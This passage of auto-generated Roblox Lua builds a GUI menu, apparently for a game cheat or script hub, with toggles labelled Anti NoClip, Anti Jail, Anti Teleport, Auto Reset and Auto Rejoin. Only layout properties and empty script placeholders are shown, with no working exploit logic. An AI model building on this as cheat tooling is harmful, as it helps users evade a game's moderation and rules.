G2L["216"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.text.text
G2L["217"] = Instance.new("UIStroke", G2L["215"]);
G2L["217"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.UIPadding
G2L["218"] = Instance.new("UIPadding", G2L["20e"]);
G2L["218"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.antiScriptTCO
G2L["219"] = Instance.new("LocalScript", G2L["1bb"]);
G2L["219"]["Name"] = [[antiScriptTCO]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip
G2L["21a"] = Instance.new("Frame", G2L["1bb"]);
G2L["21a"]["BorderSizePixel"] = 0;
G2L["21a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21a"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["21a"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["21a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21a"]["Name"] = [[noclip]];
G2L["21a"]["LayoutOrder"] = 8;
G2L["21a"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button
G2L["21b"] = Instance.new("TextButton", G2L["21a"]);
G2L["21b"]["BorderSizePixel"] = 0;
G2L["21b"]["TextTransparency"] = 1;
G2L["21b"]["TextSize"] = 14;
G2L["21b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21b"]["BackgroundTransparency"] = 1;
G2L["21b"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["21b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21b"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame
G2L["21c"] = Instance.new("Frame", G2L["21b"]);
G2L["21c"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["21c"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["21c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["21c"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["21c"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame.toggleFade
G2L["21d"] = Instance.new("CanvasGroup", G2L["21c"]);
G2L["21d"]["BorderSizePixel"] = 0;
G2L["21d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["21d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21d"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame.toggleFade.UIGradient
G2L["21e"] = Instance.new("UIGradient", G2L["21d"]);
G2L["21e"]["Rotation"] = 90;
G2L["21e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame.outlineStroke
G2L["21f"] = Instance.new("UIStroke", G2L["21c"]);
G2L["21f"]["Thickness"] = 2;
G2L["21f"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.UIPadding
G2L["220"] = Instance.new("UIPadding", G2L["21b"]);
G2L["220"]["PaddingTop"] = UDim.new(0, 3);
G2L["220"]["PaddingRight"] = UDim.new(0, 3);
G2L["220"]["PaddingLeft"] = UDim.new(0, 3);
G2L["220"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.text
G2L["221"] = Instance.new("TextLabel", G2L["21a"]);
G2L["221"]["TextWrapped"] = true;
G2L["221"]["BorderSizePixel"] = 0;
G2L["221"]["TextSize"] = 14;
G2L["221"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["221"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["221"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["221"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["221"]["BackgroundTransparency"] = 1;
G2L["221"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["221"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["221"]["Text"] = [[Anti NoClip]];
G2L["221"]["Name"] = [[text]];
G2L["221"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.text.UIPadding
G2L["222"] = Instance.new("UIPadding", G2L["221"]);
G2L["222"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.text.text
G2L["223"] = Instance.new("UIStroke", G2L["221"]);
G2L["223"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.UIPadding
G2L["224"] = Instance.new("UIPadding", G2L["21a"]);
G2L["224"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.UIListLayout
G2L["225"] = Instance.new("UIListLayout", G2L["1bb"]);
G2L["225"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["225"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.greystroke
G2L["226"] = Instance.new("UIStroke", G2L["1bb"]);
G2L["226"]["ZIndex"] = 99;
G2L["226"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["226"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["226"]["Name"] = [[greystroke]];
G2L["226"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---
G2L["227"] = Instance.new("Frame", G2L["1bb"]);
G2L["227"]["BorderSizePixel"] = 0;
G2L["227"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["227"]["Size"] = UDim2.new(1, 0, 0, 10);
G2L["227"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["227"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["227"]["Name"] = [[---DIVIDER---]];
G2L["227"]["LayoutOrder"] = 6;
G2L["227"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame
G2L["228"] = Instance.new("Frame", G2L["227"]);
G2L["228"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["228"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["228"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["228"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["228"]["Name"] = [[dividerFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.outlineStroke
G2L["229"] = Instance.new("UIStroke", G2L["228"]);
G2L["229"]["Thickness"] = 2;
G2L["229"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade
G2L["22a"] = Instance.new("CanvasGroup", G2L["228"]);
G2L["22a"]["BorderSizePixel"] = 0;
G2L["22a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22a"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["22a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22a"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
G2L["22b"] = Instance.new("UIGradient", G2L["22a"]);
G2L["22b"]["Rotation"] = 90;
G2L["22b"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.UIStroke
G2L["22c"] = Instance.new("UIStroke", G2L["228"]);
G2L["22c"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["22c"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.UICorner
G2L["22d"] = Instance.new("UICorner", G2L["228"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.UIPadding
G2L["22e"] = Instance.new("UIPadding", G2L["227"]);
G2L["22e"]["PaddingTop"] = UDim.new(0, 3);
G2L["22e"]["PaddingRight"] = UDim.new(0, 6);
G2L["22e"]["PaddingLeft"] = UDim.new(0, 6);
G2L["22e"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL
G2L["22f"] = Instance.new("Frame", G2L["1bb"]);
G2L["22f"]["BorderSizePixel"] = 0;
G2L["22f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22f"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["22f"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["22f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22f"]["Name"] = [[autoresetLABEL]];
G2L["22f"]["LayoutOrder"] = 4;
G2L["22f"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL.text
G2L["230"] = Instance.new("TextLabel", G2L["22f"]);
G2L["230"]["TextWrapped"] = true;
G2L["230"]["ZIndex"] = 10;
G2L["230"]["BorderSizePixel"] = 0;
G2L["230"]["TextSize"] = 14;
G2L["230"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["230"]["TextTransparency"] = 0.3;
G2L["230"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["230"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["230"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["230"]["BackgroundTransparency"] = 1;
G2L["230"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["230"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["230"]["Text"] = [[Auto Reset]];
G2L["230"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL.text.UIPadding
G2L["231"] = Instance.new("UIPadding", G2L["230"]);
G2L["231"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL.text.text
G2L["232"] = Instance.new("UIStroke", G2L["230"]);
G2L["232"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL
G2L["233"] = Instance.new("Frame", G2L["1bb"]);
G2L["233"]["BorderSizePixel"] = 0;
G2L["233"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["233"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["233"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["233"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["233"]["Name"] = [[autorejoinLABEL]];
G2L["233"]["LayoutOrder"] = 6;
G2L["233"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL.text
G2L["234"] = Instance.new("TextLabel", G2L["233"]);
G2L["234"]["TextWrapped"] = true;
G2L["234"]["ZIndex"] = 10;
G2L["234"]["BorderSizePixel"] = 0;
G2L["234"]["TextSize"] = 14;
G2L["234"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["234"]["TextTransparency"] = 0.3;
G2L["234"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["234"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["234"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["234"]["BackgroundTransparency"] = 1;
G2L["234"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["234"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["234"]["Text"] = [[Auto Rejoin]];
G2L["234"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL.text.UIPadding
G2L["235"] = Instance.new("UIPadding", G2L["234"]);
G2L["235"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL.text.text
G2L["236"] = Instance.new("UIStroke", G2L["234"]);
G2L["236"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail
G2L["237"] = Instance.new("Frame", G2L["1bb"]);
G2L["237"]["BorderSizePixel"] = 0;
G2L["237"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["237"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["237"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["237"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["237"]["Name"] = [[jail]];
G2L["237"]["LayoutOrder"] = 2;
G2L["237"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button
G2L["238"] = Instance.new("TextButton", G2L["237"]);
G2L["238"]["BorderSizePixel"] = 0;
G2L["238"]["TextTransparency"] = 1;
G2L["238"]["TextSize"] = 14;
G2L["238"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["238"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["238"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["238"]["BackgroundTransparency"] = 1;
G2L["238"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["238"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["238"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.UIPadding
G2L["239"] = Instance.new("UIPadding", G2L["238"]);
G2L["239"]["PaddingTop"] = UDim.new(0, 3);
G2L["239"]["PaddingRight"] = UDim.new(0, 3);
G2L["239"]["PaddingLeft"] = UDim.new(0, 3);
G2L["239"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame
G2L["23a"] = Instance.new("Frame", G2L["238"]);
G2L["23a"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["23a"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["23a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["23a"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["23a"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame.outlineStroke
G2L["23b"] = Instance.new("UIStroke", G2L["23a"]);
G2L["23b"]["Thickness"] = 2;
G2L["23b"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame.toggleFade
G2L["23c"] = Instance.new("CanvasGroup", G2L["23a"]);
G2L["23c"]["BorderSizePixel"] = 0;
G2L["23c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23c"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["23c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23c"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame.toggleFade.UIGradient
G2L["23d"] = Instance.new("UIGradient", G2L["23c"]);
G2L["23d"]["Rotation"] = 90;
G2L["23d"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.text
G2L["23e"] = Instance.new("TextLabel", G2L["237"]);
G2L["23e"]["TextWrapped"] = true;
G2L["23e"]["BorderSizePixel"] = 0;
G2L["23e"]["TextSize"] = 14;
G2L["23e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["23e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["23e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23e"]["BackgroundTransparency"] = 1;
G2L["23e"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["23e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23e"]["Text"] = [[Anti Jail]];
G2L["23e"]["Name"] = [[text]];
G2L["23e"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.text.UIPadding
G2L["23f"] = Instance.new("UIPadding", G2L["23e"]);
G2L["23f"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.text.text
G2L["240"] = Instance.new("UIStroke", G2L["23e"]);
G2L["240"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.UIPadding
G2L["241"] = Instance.new("UIPadding", G2L["237"]);
G2L["241"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport
G2L["242"] = Instance.new("Frame", G2L["1bb"]);
G2L["242"]["BorderSizePixel"] = 0;
G2L["242"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["242"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["242"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["242"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["242"]["Name"] = [[teleport]];
G2L["242"]["LayoutOrder"] = 2;
G2L["242"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.button
G2L["243"] = Instance.new("TextButton", G2L["242"]);
G2L["243"]["BorderSizePixel"] = 0;
G2L["243"]["TextTransparency"] = 1;
G2L["243"]["TextSize"] = 14;
G2L["243"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["243"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["243"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["243"]["BackgroundTransparency"] = 1;
G2L["243"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["243"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["243"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.button.UIPadding
G2L["244"] = Instance.new("UIPadding", G2L["243"]);
G2L["244"]["PaddingTop"] = UDim.new(0, 3);
G2L["244"]["PaddingRight"] = UDim.new(0, 3);
G2L["244"]["PaddingLeft"] = UDim.new(0, 3);
G2L["244"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.button.toggleFrame
G2L["245"] = Instance.new("Frame", G2L["243"]);
G2L["245"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["245"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["245"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["245"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["245"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.button.toggleFrame.outlineStroke
G2L["246"] = Instance.new("UIStroke", G2L["245"]);
G2L["246"]["Thickness"] = 2;
G2L["246"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.button.toggleFrame.toggleFade
G2L["247"] = Instance.new("CanvasGroup", G2L["245"]);
G2L["247"]["BorderSizePixel"] = 0;
G2L["247"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["247"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["247"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["247"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["247"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.button.toggleFrame.toggleFade.UIGradient
G2L["248"] = Instance.new("UIGradient", G2L["247"]);
G2L["248"]["Rotation"] = 90;
G2L["248"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.text
G2L["249"] = Instance.new("TextLabel", G2L["242"]);
G2L["249"]["TextWrapped"] = true;
G2L["249"]["BorderSizePixel"] = 0;
G2L["249"]["TextSize"] = 14;
G2L["249"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["249"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["249"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["249"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["249"]["BackgroundTransparency"] = 1;
G2L["249"]["Size"] = UDim2.new(0, 156, 0, 20);
G2L["249"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["249"]["Text"] = [[Anti Teleport]];
G2L["249"]["Name"] = [[text]];
G2L["249"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.text.UIPadding
G2L["24a"] = Instance.new("UIPadding", G2L["249"]);
G2L["24a"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.text.text
G2L["24b"] = Instance.new("UIStroke", G2L["249"]);
G2L["24b"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.teleport.UIPadding
G2L["24c"] = Instance.new("UIPadding", G2L["242"]);
G2L["24c"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside
G2L["24d"] = Instance.new("Frame", G2L["1b8"]);
G2L["24d"]["BorderSizePixel"] = 0;
G2L["24d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["24d"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["24d"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
G2L["24d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24d"]["Name"] = [[leftside]];
G2L["24d"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab
G2L["24e"] = Instance.new("Frame", G2L["24d"]);
G2L["24e"]["BorderSizePixel"] = 0;
G2L["24e"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["24e"]["Size"] = UDim2.new(0, 176, 0, 160);
G2L["24e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24e"]["Name"] = [[mainTab]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.mainScriptTCO
G2L["24f"] = Instance.new("LocalScript", G2L["24e"]);
G2L["24f"]["Name"] = [[mainScriptTCO]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======ACCENT======
G2L["250"] = Instance.new("Frame", G2L["24e"]);
G2L["250"]["BorderSizePixel"] = 0;
G2L["250"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["250"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["250"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["250"]["Name"] = [[======ACCENT======]];
G2L["250"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======ACCENT======.GuiColor
G2L["251"] = Instance.new("Frame", G2L["250"]);
G2L["251"]["BorderSizePixel"] = 0;
G2L["251"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["251"]["Size"] = UDim2.new(1, -2, 0, 2);
G2L["251"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["251"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["251"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======ACCENT======.GuiColor.UICorner
G2L["252"] = Instance.new("UICorner", G2L["251"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.UIListLayout
G2L["253"] = Instance.new("UIListLayout", G2L["24e"]);
G2L["253"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["253"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======
G2L["254"] = Instance.new("Frame", G2L["24e"]);
G2L["254"]["BorderSizePixel"] = 0;
G2L["254"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["254"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["254"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["254"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["254"]["Name"] = [[======TITLE======]];
G2L["254"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.text
G2L["255"] = Instance.new("TextLabel", G2L["254"]);
G2L["255"]["TextWrapped"] = true;
G2L["255"]["BorderSizePixel"] = 0;
G2L["255"]["TextSize"] = 14;
G2L["255"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["255"]["TextTransparency"] = 0.3;
G2L["255"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["255"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["255"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["255"]["BackgroundTransparency"] = 1;
G2L["255"]["Size"] = UDim2.new(1, 0, 0, 15);
